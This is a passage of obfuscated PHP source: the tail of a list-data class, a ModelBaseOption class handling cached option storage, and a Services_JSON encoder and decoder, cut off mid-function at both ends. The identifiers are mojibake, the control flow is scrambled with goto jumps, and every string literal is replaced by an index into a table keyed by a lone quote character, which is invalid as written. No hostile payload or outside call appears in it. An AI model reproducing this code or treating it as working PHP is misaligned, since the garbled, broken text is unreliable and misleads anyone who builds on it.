++$AÔÛÕ•³ò; $EÖµ“›¥Ôì[$B¢ÕÜ…á…ˆ[187]] = time(); goto cÑ³Ì«Ş›µ; C¾Û˜çŒ„ò: return $AÔÛÕ•³ò; goto bàİ÷áÆåâ; cÑ³Ì«Ş›µ: $EÖµ“›¥Ôì[$B¢ÕÜ…á…ˆ[107]] = time(); Model($this->modelType)->set($B¢ÕÜ…á…ˆ[365], $AÔÛÕ•³ò, $this->optionType . $B¢ÕÜ…á…ˆ[366]); Model($this->modelType)->set($B¢ÕÜ…á…ˆ[364] . $AÔÛÕ•³ò, $EÖµ“›¥Ôì, $this->optionType); goto C¾Û˜çŒ„ò; bàİ÷áÆåâ: } public function update($Bƒ¤­¾°Æ, $B¨©ÇªÅæã) { goto c Ú¬®®ƒ; fè¤Òã¤¡: if (!$f•Ñ¶¦ÉÁ£) { return !1; } $B¨©ÇªÅæã = array_merge($f•Ñ¶¦ÉÁ£, $B¨©ÇªÅæã); $B¨©ÇªÅæã[$CÏ’Öõí§[107]] = time(); goto C“±„ˆ®Ã´; C“±„ˆ®Ã´: return Model($this->modelType)->set($CÏ’Öõí§[364] . $Bƒ¤­¾°Æ, $B¨©ÇªÅæã, $this->optionType); goto CòŒ£¾ÄÉå; c Ú¬®®ƒ: $CÏ’Öõí§ =& $_SERVER[“]; $B¨©ÇªÅæã = array_field_key($B¨©ÇªÅæã, $this->field); $f•Ñ¶¦ÉÁ£ = $this->listData($Bƒ¤­¾°Æ); goto fè¤Òã¤¡; CòŒ£¾ÄÉå: } public function remove($Bø¤ñ˜¨ÌŒ) { return Model($this->modelType)->remove($_SERVER[“][364] . $Bø¤ñ˜¨ÌŒ, $this->optionType); } public function clear() { $fƒ²Œìò”» =& $_SERVER[“]; Model($this->modelType)->remove($fƒ²Œìò”»[365], $this->optionType . $fƒ²Œìò”»[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($D§¹¥Éİƒå, $DÔäÍ¬•) { if (!$DÔäÍ¬•) { return !1; } $AéÂ’ª”İ• = $this->listData(); $AéÂ’ª”İ• = array_to_keyvalue($AéÂ’ª”İ•, $D§¹¥Éİƒå); return isset($AéÂ’ª”İ•[$DÔäÍ¬•]) ? $AéÂ’ª”İ•[$DÔäÍ¬•] : !1; } public function findByName($A¯í›ëÚÖ) { return $this->findByKey($_SERVER[“][28], $A¯í›ëÚÖ); } protected function resetData($BÄİ½ëá‹ù) { $CäÈÚÁ†ì‰ =& $_SERVER[“]; $BÄİ½ëá‹ù = is_array($BÄİ½ëá‹ù) ? $BÄİ½ëá‹ù : array(); $F‚á¸ËîŒ = array(); for ($dí–Š¨Êƒ˜ = 0; $dí–Š¨Êƒ˜ < count($BÄİ½ëá‹ù); $dí–Š¨Êƒ˜++) { $F‚á¸ËîŒ[$CäÈÚÁ†ì‰[364] . $BÄİ½ëá‹ù[$dí–Š¨Êƒ˜][$CäÈÚÁ†ì‰[367]]] = $BÄİ½ëá‹ù[$dí–Š¨Êƒ˜]; } return Model($this->modelType)->set($F‚á¸ËîŒ, !1, $this->optionType); } private function getAutoName($dÉŞã©ƒğğ) { $D„Ïğ†áë = array_to_keyvalue($this->listData(), $_SERVER[“][28]); if (!$D„Ïğ†áë || !isset($D„Ïğ†áë[$dÉŞã©ƒğğ])) { return $dÉŞã©ƒğğ; } for ($f»÷‰…Ø‰Û = 1; $f»÷‰…Ø‰Û < count($D„Ïğ†áë); $f»÷‰…Ø‰Û++) { $c¾÷„¬áÊ£ = $dÉŞã©ƒğğ . "\x28{$f»÷‰…Ø‰Û}\51"; if (!isset($D„Ïğ†áë[$c¾÷„¬áÊ£])) { return $c¾÷„¬áÊ£; } } return $c¾÷„¬áÊ£; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($C ã¤ÒØ­ = false, $eƒÓÁƒ®Òª = '', $Cñì²®¥ÜÑ = false) { goto fÎª‚»ñ‡; c·öÚßÇÜî: $DÔ¹äÙñØ‚ = $this->where($eœÍÔËªµÁ)->select(); $DÔ¹äÙñØ‚ = array_to_keyvalue($DÔ¹äÙñØ‚, $aç¨‹Áâ¼[89], $aç¨‹Áâ¼[359]); foreach ($DÔ¹äÙñØ‚ as $cßøíí§„ì => $F£ß¹—¤Ûî) { if ($Cñì²®¥ÜÑ || in_array($cßøíí§„ì, $this->jsonField)) { $DÔ¹äÙñØ‚[$cßøíí§„ì] = json_decode($F£ß¹—¤Ûî, !0); } } goto AÙ…‘ß‚¹÷; aÓº³ÜÊôÕ: $F ª·ŒŒÙÜ = is_array($F ª·ŒŒÙÜ) ? $F ª·ŒŒÙÜ : array(); if (is_array($DÔ¹äÙñØ‚)) { $DÔ¹äÙñØ‚ = array_merge($F ª·ŒŒÙÜ, $DÔ¹äÙñØ‚); return $C ã¤ÒØ­ ? isset($DÔ¹äÙñØ‚[$C ã¤ÒØ­]) ? $DÔ¹äÙñØ‚[$C ã¤ÒØ­] : null : $DÔ¹äÙñØ‚; } $eœÍÔËªµÁ = $this->filterWhere(array($aç¨‹Áâ¼[29] => $eƒÓÁƒ®Òª)); goto c·öÚßÇÜî; AÙ…‘ß‚¹÷: $this->cacheSet($eƒÓÁƒ®Òª, $DÔ¹äÙñØ‚); $DÔ¹äÙñØ‚ = array_merge($F ª·ŒŒÙÜ, $DÔ¹äÙñØ‚); return $C ã¤ÒØ­ ? $DÔ¹äÙñØ‚[$C ã¤ÒØ­] : $DÔ¹äÙñØ‚; goto c¢ŒŠêÚÕì; fÎª‚»ñ‡: $aç¨‹Áâ¼ =& $_SERVER[“]; $DÔ¹äÙñØ‚ = $this->cacheGet($eƒÓÁƒ®Òª); $F ª·ŒŒÙÜ = $this->optionDefault($eƒÓÁƒ®Òª); goto aÓº³ÜÊôÕ; c¢ŒŠêÚÕì: } public function set($AËòÕÓù„—, $aÒ½ŒˆÆ°Ø = false, $e²Öàš‰± = '') { goto a‹êÕ‹İ­Ø; E§Ú“‹Ê˜: return $this->addAll($a‡»§Á±ò«, array(), !0); goto EÒ—¥ç›Ã…; CµóííÈªÂ: $A½×¬´£â = is_array($AËòÕÓù„—) ? $AËòÕÓù„— : array($AËòÕÓù„— => $aÒ½ŒˆÆ°Ø); foreach ($A½×¬´£â as $A¿³–¸Ï´º => $f×²‡’’) { if (is_array($f×²‡’’)) { $f×²‡’’ = json_encode_force($f×²‡’’); } $this->checkLength($f×²‡’’, !1, $this->tableName . $BÍ­’ÌÃ¹î[4] . $AËòÕÓù„—); $f×²‡’’ = self::textEncode($f×²‡’’); $A½×¬´£â = array($BÍ­’ÌÃ¹î[29] => $e²Öàš‰±, $BÍ­’ÌÃ¹î[89] => $A¿³–¸Ï´º, $BÍ­’ÌÃ¹î[359] => $f×²‡’’); $a‡»§Á±ò«[] = $this->filterWhere($A½×¬´£â); } if (!$a‡»§Á±ò«) { return !0; } goto E§Ú“‹Ê˜; a‹êÕ‹İ­Ø: $BÍ­’ÌÃ¹î =& $_SERVER[“]; $this->cacheRemove($e²Öàš‰±); $a‡»§Á±ò« = array(); goto CµóííÈªÂ; EÒ—¥ç›Ã…: } protected function optionDefault($AåîŞğ‹ª™ = '') { return !1; } public function setDeep($a‚ò¨¬×à, $DÁ§‰ÂËÔ = false, $A—”å™†›¸ = '') { $Dä§³ĞÈŠ™ = explode($_SERVER[“][91], $a‚ò¨¬×à); $b‘ä–æÍ‘ô = $this->get(); array_set_value($b‘ä–æÍ‘ô, $a‚ò¨¬×à, $DÁ§‰ÂËÔ); $this->set($Dä§³ĞÈŠ™[0], $b‘ä–æÍ‘ô[$Dä§³ĞÈŠ™[0]], $A—”å™†›¸); } public function remove($bÁ±Á°Ÿ³ğ, $eƒøˆ¤ÎÎ = '') { $e“ëİ»¯Î =& $_SERVER[“]; $this->cacheRemove($eƒøˆ¤ÎÎ); $e¬¶ãÇÚ«Á = $this->filterWhere(array($e“ëİ»¯Î[89] => $bÁ±Á°Ÿ³ğ, $e“ëİ»¯Î[29] => $eƒøˆ¤ÎÎ)); if (is_null($bÁ±Á°Ÿ³ğ)) { unset($e¬¶ãÇÚ«Á[$e“ëİ»¯Î[89]]); } return $this->where($e¬¶ãÇÚ«Á)->delete(); } public function cacheSet($AâæËñ×ˆ», $fƒí¼§ôñ• = false) { return Cache::set($this->cacheKey($AâæËñ×ˆ»), $fƒí¼§ôñ•); } public function cacheGet($B¯‹á™ç†Ğ) { return Cache::get($this->cacheKey($B¯‹á™ç†Ğ)); } public function cacheRemove($B’¼œÔ…¨±) { return Cache::remove($this->cacheKey($B’¼œÔ…¨±)); } protected function filterWhere($cğš¥Ú´ˆÇ) { return $cğš¥Ú´ˆÇ; } protected function cacheKey($D“»æ“í) { return $D“»æ“í; } } goto Eóˆ«¾³ìŠ; EğÇá‘¿ã¡: define($_SERVER[“][1927], 16); define($_SERVER[“][1928], 32); class Services_JSON { function __construct($BŸÃ¡‡Û‡ = 0) { $this->use = $BŸÃ¡‡Û‡; } function utf162utf8($F¼½…²Ê‡¿) { $b äç¬‹• =& $_SERVER[“]; if (function_exists($b äç¬‹•[68])) { return mb_convert_encoding($F¼½…²Ê‡¿, $b äç¬‹•[1576], $b äç¬‹•[1929]); } $eÈöšõ‘Ã— = ord($F¼½…²Ê‡¿[0]) << 8 | ord($F¼½…²Ê‡¿[1]); switch (!0) { case (127 & $eÈöšõ‘Ã—) == $eÈöšõ‘Ã—: return chr(127 & $eÈöšõ‘Ã—); case (2047 & $eÈöšõ‘Ã—) == $eÈöšõ‘Ã—: return chr(192 | $eÈöšõ‘Ã— >> 6 & 31) . chr(128 | $eÈöšõ‘Ã— & 63); case (65535 & $eÈöšõ‘Ã—) == $eÈöšõ‘Ã—: return chr(224 | $eÈöšõ‘Ã— >> 12 & 15) . chr(128 | $eÈöšõ‘Ã— >> 6 & 63) . chr(128 | $eÈöšõ‘Ã— & 63); } return $b äç¬‹•[33]; } function utf82utf16($E¼¨¸È¥ß) { $C™³â× Âë =& $_SERVER[“]; if (function_exists($C™³â× Âë[68])) { return mb_convert_encoding($E¼¨¸È¥ß, $C™³â× Âë[1929], $C™³â× Âë[1576]); } switch (strlen($E¼¨¸È¥ß)) { case 1: return $E¼¨¸È¥ß; case 2: return chr(7 & ord($E¼¨¸È¥ß[0]) >> 2) . chr(192 & ord($E¼¨¸È¥ß[0]) << 6 | 63 & ord($E¼¨¸È¥ß[1])); case 3: return chr(240 & ord($E¼¨¸È¥ß[0]) << 4 | 15 & ord($E¼¨¸È¥ß[1]) >> 2) . chr(192 & ord($E¼¨¸È¥ß[1]) << 6 | 127 & ord($E¼¨¸È¥ß[2])); } return $C™³â× Âë[33]; } function encode($D¹È–¿¿¹±) { $fíàæªƒÒ =& $_SERVER[“]; switch (gettype($D¹È–¿¿¹±)) { case $fíàæªƒÒ[1587]: return $D¹È–¿¿¹± ? $fíàæªƒÒ[1586] : $fíàæªƒÒ[1588]; case $fíàæªƒÒ[1930]: return $fíàæªƒÒ[99]; case $fíàæªƒÒ[303]: return (int) $D¹È–¿¿¹±; case $fíàæªƒÒ[278]: case $fíàæªƒÒ[277]: return (double) $D¹È–¿¿¹±; case $fíàæªƒÒ[312]: $B±¦ùÁÒŠ» = $fíàæªƒÒ[33]; $EÚĞäÎ× = strlen($D¹È–¿¿¹±); for ($cÏ‡©ÒÕ¼ = 0; $cÏ‡©ÒÕ¼ < $EÚĞäÎ×; ++$cÏ‡©ÒÕ¼) { $eÀ­…½Şœ = ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼]); switch (!0) { case $eÀ­…½Şœ == 8: $B±¦ùÁÒŠ» .= $fíàæªƒÒ[1931]; break; case $eÀ­…½Şœ == 9: $B±¦ùÁÒŠ» .= $fíàæªƒÒ[1563]; break; case $eÀ­…½Şœ == 10: $B±¦ùÁÒŠ» .= $fíàæªƒÒ[1561]; break; case $eÀ­…½Şœ == 12: $B±¦ùÁÒŠ» .= $fíàæªƒÒ[1932]; break; case $eÀ­…½Şœ == 13: $B±¦ùÁÒŠ» .= $fíàæªƒÒ[1562]; break; case $eÀ­…½Şœ == 34: case $eÀ­…½Şœ == 47: case $eÀ­…½Şœ == 92: $B±¦ùÁÒŠ» .= $fíàæªƒÒ[93] . $D¹È–¿¿¹±[$cÏ‡©ÒÕ¼]; break; case $eÀ­…½Şœ >= 32 && $eÀ­…½Şœ <= 127: $B±¦ùÁÒŠ» .= $D¹È–¿¿¹±[$cÏ‡©ÒÕ¼]; break; case ($eÀ­…½Şœ & 224) == 192: $E­éÚÑ´‡ = pack($fíàæªƒÒ[1933], $eÀ­…½Şœ, ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 1])); $cÏ‡©ÒÕ¼ += 1; $D‚ºùÆéëµ = $this->utf82utf16($E­éÚÑ´‡); $B±¦ùÁÒŠ» .= sprintf($fíàæªƒÒ[1934], bin2hex($D‚ºùÆéëµ)); break; case ($eÀ­…½Şœ & 240) == 224: $E­éÚÑ´‡ = pack($fíàæªƒÒ[1933], $eÀ­…½Şœ, ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 1]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 2])); $cÏ‡©ÒÕ¼ += 2; $D‚ºùÆéëµ = $this->utf82utf16($E­éÚÑ´‡); $B±¦ùÁÒŠ» .= sprintf($fíàæªƒÒ[1934], bin2hex($D‚ºùÆéëµ)); break; case ($eÀ­…½Şœ & 248) == 240: $E­éÚÑ´‡ = pack($fíàæªƒÒ[1933], $eÀ­…½Şœ, ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 1]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 2]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 3])); $cÏ‡©ÒÕ¼ += 3; $D‚ºùÆéëµ = $this->utf82utf16($E­éÚÑ´‡); $B±¦ùÁÒŠ» .= sprintf($fíàæªƒÒ[1934], bin2hex($D‚ºùÆéëµ)); break; case ($eÀ­…½Şœ & 252) == 248: $E­éÚÑ´‡ = pack($fíàæªƒÒ[1933], $eÀ­…½Şœ, ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 1]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 2]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 3]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 4])); $cÏ‡©ÒÕ¼ += 4; $D‚ºùÆéëµ = $this->utf82utf16($E­éÚÑ´‡); $B±¦ùÁÒŠ» .= sprintf($fíàæªƒÒ[1934], bin2hex($D‚ºùÆéëµ)); break; case ($eÀ­…½Şœ & 254) == 252: $E­éÚÑ´‡ = pack($fíàæªƒÒ[1933], $eÀ­…½Şœ, ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 1]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 2]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 3]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 4]), ord($D¹È–¿¿¹±[$cÏ‡©ÒÕ¼ + 5])); $cÏ‡©ÒÕ¼ += 5; $D‚ºùÆéëµ = $this->utf82utf16($E­éÚÑ´‡); $B±¦ùÁÒŠ» .= sprintf($fíàæªƒÒ[1934], bin2hex($D‚ºùÆéëµ)); break; } } return $fíàæªƒÒ[113] . $B±¦ùÁÒŠ» . $fíàæªƒÒ[113]; case $fíàæªƒÒ[1935]: if (is_array($D¹È–¿¿¹±) && count($D¹È–¿¿¹±) && array_keys($D¹È–¿¿¹±) !== range(0, sizeof($D¹È–¿¿¹±) - 1)) { $c­åæ»ìÊà = array_map(array($this, $fíàæªƒÒ[1936]), array_keys($D¹È–¿¿¹±), array_values($D¹È–¿¿¹±)); foreach ($c­åæ»ìÊà as $AŒ¦ø£íŠ–) { if (Services_JSON::isError($AŒ¦ø£íŠ–)) { return $AŒ¦ø£íŠ–; } } return $fíàæªƒÒ[1055] . join($fíàæªƒÒ[47], $c­åæ»ìÊà) . $fíàæªƒÒ[315]; } $FÔëˆø·‘­ = array_map(array($this, $fíàæªƒÒ[1937]), $D¹È–¿¿¹±); foreach ($FÔëˆø·‘­ as $fèÙÄ™„ÎÜ) { if (Services_JSON::isError($fèÙÄ™„ÎÜ)) { return $fèÙÄ™„ÎÜ; } } return $fíàæªƒÒ[157] . join($fíàæªƒÒ[47], $FÔëˆø·‘­) . $fíàæªƒÒ[478]; case $fíàæªƒÒ[1938]: $f‚ÔĞ‹èÑ = get_object_vars($D¹È–¿¿¹±); $c­åæ»ìÊà = array_map(array($this, $fíàæªƒÒ[1936]), array_keys($f‚ÔĞ‹èÑ), array_values($f‚ÔĞ‹èÑ)); foreach ($c­åæ»ìÊà as $AŒ¦ø£íŠ–) { if (Services_JSON::isError($AŒ¦ø£íŠ–)) { return $AŒ¦ø£íŠ–; } } return $fíàæªƒÒ[1055] . join($fíàæªƒÒ[47], $c­åæ»ìÊà) . $fíàæªƒÒ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $fíàæªƒÒ[99] : new Services_JSON_Error(gettype($D¹È–¿¿¹±) . $fíàæªƒÒ[1939]); } } function name_value($Eİçï¥õàÌ, $aĞÑ“ÏàèÖ) { $f‡«ˆµ™ø„ = $this->encode($aĞÑ“ÏàèÖ); if (Services_JSON::isError($f‡«ˆµ™ø„)) { return $f‡«ˆµ™ø„; } return $this->encode(strval($Eİçï¥õàÌ)) . $_SERVER[“][4] . $f‡«ˆµ™ø„; } function reduce_string($aÛš’ç¼‘ø) { $a§Œ·İ³© =& $_SERVER[“]; $aÛš’ç¼‘ø = preg_replace(array($a§Œ·İ³©[1940], $a§Œ·İ³©[1941], $a§Œ·İ³©[1942]), $a§Œ·İ³©[33], $aÛš’ç¼‘ø); return trim($aÛš’ç¼‘ø); } function decode($dÌå¤Â•â—) { $D©¤”íƒ…Š =& $_SERVER[“]; $dÌå¤Â•â— = $this->reduce_string($dÌå¤Â•â—); switch (strtolower($dÌå¤Â•â—)) { case $D©¤”íƒ…Š[1586]: return !0; case $D©¤”íƒ…Š[1588]: return !1; case $D©¤”íƒ…Š[99]: return null; default: $bœÛÎ³³ŒŞ = array(); if (is_numeric($dÌå¤Â•â—)) { return (double) $dÌå¤Â•â— == (int) $dÌå¤Â•â— ? (int) $dÌå¤Â•â— : (double) $dÌå¤Â•â—; } elseif (preg_match($D©¤”íƒ…Š[1943], $dÌå¤Â•â—, $bœÛÎ³³ŒŞ) && $bœÛÎ³³ŒŞ[1] == $bœÛÎ³³ŒŞ[2]) { $aíÈ‰åîˆï = substr($dÌå¤Â•â—, 0, 1); $E¯×‚­Ô¸î = substr($dÌå¤Â•â—, 1, -1); $eİÅ­ˆÉÙ = $D©¤”íƒ…Š[33]; $b›‚…¥¨‘ = strlen($E¯×‚­Ô¸î); for ($DÂˆèàÉø‚ = 0; $DÂˆèàÉø‚ < $b›‚…¥¨‘; ++$DÂˆèàÉø‚) { $fƒÍ÷³¡„ = substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚, 2); $fƒÄè–ğ¿£ = ord($E¯×‚­Ô¸î[$DÂˆèàÉø‚]); switch (!0) { case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1931]: $eİÅ­ˆÉÙ .= chr(8); ++$DÂˆèàÉø‚; break; case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1563]: $eİÅ­ˆÉÙ .= chr(9); ++$DÂˆèàÉø‚; break; case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1561]: $eİÅ­ˆÉÙ .= chr(10); ++$DÂˆèàÉø‚; break; case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1932]: $eİÅ­ˆÉÙ .= chr(12); ++$DÂˆèàÉø‚; break; case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1562]: $eİÅ­ˆÉÙ .= chr(13); ++$DÂˆèàÉø‚; break; case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1342]: case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1944]: case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1556]: case $fƒÍ÷³¡„ == $D©¤”íƒ…Š[1558]: if ($aíÈ‰åîˆï == $D©¤”íƒ…Š[113] && $fƒÍ÷³¡„ != $D©¤”íƒ…Š[1944] || $aíÈ‰åîˆï == $D©¤”íƒ…Š[55] && $fƒÍ÷³¡„ != $D©¤”íƒ…Š[1342]) { $eİÅ­ˆÉÙ .= $E¯×‚­Ô¸î[++$DÂˆèàÉø‚]; } break; case preg_match($D©¤”íƒ…Š[1945], substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚, 6)): $c¨¼õÉê– = chr(hexdec(substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚ + 2, 2))) . chr(hexdec(substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚ + 4, 2))); $eİÅ­ˆÉÙ .= $this->utf162utf8($c¨¼õÉê–); $DÂˆèàÉø‚ += 5; break; case $fƒÄè–ğ¿£ >= 32 && $fƒÄè–ğ¿£ <= 127: $eİÅ­ˆÉÙ .= $E¯×‚­Ô¸î[$DÂˆèàÉø‚]; break; case ($fƒÄè–ğ¿£ & 224) == 192: $eİÅ­ˆÉÙ .= substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚, 2); ++$DÂˆèàÉø‚; break; case ($fƒÄè–ğ¿£ & 240) == 224: $eİÅ­ˆÉÙ .= substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚, 3); $DÂˆèàÉø‚ += 2; break; case ($fƒÄè–ğ¿£ & 248) == 240: $eİÅ­ˆÉÙ .= substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚, 4); $DÂˆèàÉø‚ += 3; break; case ($fƒÄè–ğ¿£ & 252) == 248: $eİÅ­ˆÉÙ .= substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚, 5); $DÂˆèàÉø‚ += 4; break; case ($fƒÄè–ğ¿£ & 254) == 252: $eİÅ­ˆÉÙ .= substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚, 6); $DÂˆèàÉø‚ += 5; break; } } return $eİÅ­ˆÉÙ; } elseif (preg_match($D©¤”íƒ…Š[1946], $dÌå¤Â•â—) || preg_match($D©¤”íƒ…Š[1947], $dÌå¤Â•â—)) { goto AŠÑÄ°³øÚ; AŠÑÄ°³øÚ: if ($dÌå¤Â•â—[0] == $D©¤”íƒ…Š[157]) { $FÏ±ãë„­– = array(SERVICES_JSON_IN_ARR); $Fìµ«—âˆ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $FÏ±ãë„­– = array(SERVICES_JSON_IN_OBJ); $eˆ ˆÍ’‡ = array(); } else { $FÏ±ãë„­– = array(SERVICES_JSON_IN_OBJ); $eˆ ˆÍ’‡ = new stdClass(); } } array_push($FÏ±ãë„­–, array($D©¤”íƒ…Š[1948] => SERVICES_JSON_SLICE, $D©¤”íƒ…Š[263] => 0, $D©¤”íƒ…Š[1949] => !1)); $E¯×‚­Ô¸î = substr($dÌå¤Â•â—, 1, -1); goto cÊÁÚ‰İº; fªÆéÍ: for ($DÂˆèàÉø‚ = 0; $DÂˆèàÉø‚ <= $b›‚…¥¨‘; ++$DÂˆèàÉø‚) { $Eîè˜Œˆ = end($FÏ±ãë„­–); $fƒÍ÷³¡„ = substr($E¯×‚­Ô¸î, $DÂˆèàÉø‚, 2); if ($DÂˆèàÉø‚ == $b›‚…¥¨‘ || $E¯×‚­Ô¸î[$DÂˆèàÉø‚] == $D©¤”íƒ…Š[47] && $Eîè˜Œˆ[$D©¤”íƒ…Š[1948]] == SERVICES_JSON_SLICE) { $F´¸èÅ˜ë™ = substr($E¯×‚­Ô¸î, $Eîè˜Œˆ[$D©¤”íƒ…Š[263]], $DÂˆèàÉø‚ - $Eîè˜Œˆ[$D©¤”íƒ…Š[263]]); array_push($FÏ±ãë„­–, array($D©¤”íƒ…Š[1948] => SERVICES_JSON_SLICE, $D©¤”íƒ…Š[263] => $DÂˆèàÉø‚ + 1, $D©¤”íƒ…Š[1949] => !1)); if (reset($FÏ±ãë„­–) == SERVICES_JSON_IN_ARR) { array_push($Fìµ«—âˆ, $this->decode($F´¸èÅ˜ë™)); } elseif (reset($FÏ±ãë„­–) == SERVICES_JSON_IN_OBJ) { $D•á™÷Ş±³ = array(); if (preg_match($D©¤”íƒ…Š[1950], $F´¸èÅ˜ë™, $D•á™÷Ş±³)) { $Aò‰µ¼­Ü = $this->decode($D•á™÷Ş±³[1]); $Aøà•ø©ù  = $this->decode($D•á™÷Ş±³[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eˆ ˆÍ’‡[$Aò‰µ¼­Ü] = $Aøà•ø©ù ; } else { $eˆ ˆÍ’‡->{$Aò‰µ¼­Ü} = $Aøà•ø©ù ; } } elseif (preg_match($D©¤”íƒ…Š[1951], $F´¸èÅ˜ë™, $D•á™÷Ş±³)) { $Aò‰µ¼­Ü = $D•á™÷Ş±³[1]; $Aøà•ø©ù  = $this->decode($D•á™÷Ş±³[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eˆ ˆÍ’‡[$Aò‰µ¼­Ü] = $Aøà•ø©ù ; } else { $eˆ ˆÍ’‡->{$Aò‰µ¼­Ü} = $Aøà•ø©ù ; } } } } elseif (($E¯×‚­Ô¸î[$DÂˆèàÉø‚] == $D©¤”íƒ…Š[113] || $E¯×‚­Ô¸î[$DÂˆèàÉø‚] == $D©¤”íƒ…Š[55]) && $Eîè˜Œˆ[$D©¤”íƒ…Š[1948]] != SERVICES_JSON_IN_STR) { array_push($FÏ±ãë„­–, array($D©¤”íƒ…Š[1948] => SERVICES_JSON_IN_STR, $D©¤”íƒ…Š[263] => $DÂˆèàÉø‚, $D©¤”íƒ…Š[1949] => $E¯×‚­Ô¸î[$DÂˆèàÉø‚])); } elseif ($E¯×‚­Ô¸î[$DÂˆèàÉø‚] == $Eîè˜Œˆ[$D©¤”íƒ…Š[1949]] && $Eîè˜Œˆ[$D©¤”íƒ…Š[1948]] == SERVICES_JSON_IN_STR && (strlen(substr($E¯×‚­Ô¸î, 0, $DÂˆèàÉø‚)) - strlen(rtrim(substr($E¯×‚­Ô¸î, 0, $DÂˆèàÉø‚), $D©¤”íƒ…Š[93]))) % 2 != 1) { array_pop($FÏ±ãë„­–); } elseif ($E¯×‚­Ô¸î[$DÂˆèàÉø‚] == $D©¤”íƒ…Š[157] && in_array($Eîè˜Œˆ[$D©¤”íƒ…Š[1948]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($FÏ±ãë„­–, array($D©¤”íƒ…Š[1948] => SERVICES_JSON_IN_ARR, $D©¤”íƒ…Š[263] => $DÂˆèàÉø‚, $D©¤”íƒ…Š[1949] => !1)); } elseif ($E¯×‚­Ô¸î[$DÂˆèàÉø‚] == $D©¤”íƒ…Š[478] && $Eîè˜Œˆ[$D©¤”íƒ…Š[1948]] == SERVICES_JSON_IN_ARR) { array_pop($FÏ±ãë„­–); } elseif ($E¯×‚­Ô¸î[$DÂˆèàÉø‚] == $D©¤”íƒ…Š[1055] && in_array($Eîè˜Œˆ[$D©¤”íƒ…Š[1948]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($FÏ±ãë„­–, array($D©¤”íƒ…Š[1948] => SERVICES_JSON_IN_OBJ, $D©¤”íƒ…Š[263] => $DÂˆèàÉø‚, $D©¤”íƒ…Š[1949] => !1)); } elseif ($E¯×‚­Ô¸î[$DÂˆèàÉø‚] == $D©¤”íƒ…Š[315] && $Eîè˜Œˆ[$D©¤”íƒ…Š[1948]] == SERVICES_JSON_IN_OBJ) { array_pop($FÏ±ãë„­–); } elseif ($fƒÍ÷³¡„ == $D©¤”íƒ…Š[1952] && in_array($Eîè˜Œˆ[$D©¤”íƒ…Š[1948]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($FÏ±ãë„­–, array($D©¤”íƒ…Š[1948] => SERVICES_JSON_IN_CMT, $D©¤”íƒ…Š[263] => $DÂˆèàÉø‚, $D©¤”íƒ…Š[1949] => !1)); $DÂˆèàÉø‚++; } elseif ($fƒÍ÷³¡„ == $D©¤”íƒ…Š[1953] && $Eîè˜Œˆ[$D©¤”íƒ…Š[1948]] == SERVICES_JSON_IN_CMT) { array_pop($FÏ±ãë„­–); $DÂˆèàÉø‚++; for ($e‡â¨©¿…à = $Eîè˜Œˆ[$D©¤”íƒ…Š[263]]; $e‡â¨©¿…à <= $DÂˆèàÉø‚; ++$e‡â¨©¿…à) { $E¯×‚­Ô¸î = substr_replace($E¯×‚­Ô¸î, $D©¤”íƒ…Š[50], $e‡â¨©¿…à, 1); } } } if (reset($FÏ±ãë„­–) == SERVICES_JSON_IN_ARR) { return $Fìµ«—âˆ; } elseif (reset($FÏ±ãë„­–) == SERVICES_JSON_IN_OBJ) { return $eˆ ˆÍ’‡; } goto a÷ŠšŞÀ´; cÊÁÚ‰İº: $E¯×‚­Ô¸î = $this->reduce_string($E¯×‚­Ô¸î); if ($E¯×‚­Ô¸î == $D©¤”íƒ…Š[33]) { if (reset($FÏ±ãë„­–) == SERVICES_JSON_IN_ARR) { return $Fìµ«—âˆ; } else { return $eˆ ˆÍ’‡; } } $b›‚…¥¨‘ = strlen($E¯×‚­Ô¸î); goto fªÆéÍ; a÷ŠšŞÀ´: } } } function isError($FÆ”‘·Æ, $CÒª¥ç­ë½ = null) { $aœ±ï…†ï =& $_SERVER[“]; if 